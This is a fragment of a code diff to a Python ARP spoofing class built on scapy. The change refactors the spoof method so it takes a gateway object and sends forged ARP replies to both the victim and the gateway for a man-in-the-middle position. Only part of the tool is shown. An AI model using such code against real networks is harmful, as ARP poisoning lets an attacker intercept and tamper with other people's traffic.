@@ -4,10 +4,10 @@ from classes.ARPPacket import ARPPacket
 from scapy.all import *
 
 class ARP:
-    def __init__(self, attacker, victim, spoof_ip):
+    def __init__(self, attacker, victim, gateway):
         self.attacker = attacker
         self.victim = victim
-        self.spoof_ip = spoof_ip
+        self.gateway = gateway
 
 
     def spoof(self, mitm = False):
@@ -19,11 +19,9 @@ class ARP:
         victim_packet.send()
         
         if (mitm):
-            gateway = User(self.spoof_ip)
-            gateway.get_mac()
             gateway_packet = ARPPacket(
                 self.attacker,
-                gateway,
-                self.victim
+                self.gateway,
+                self.victim.IP
             )
             gateway_packet.send()
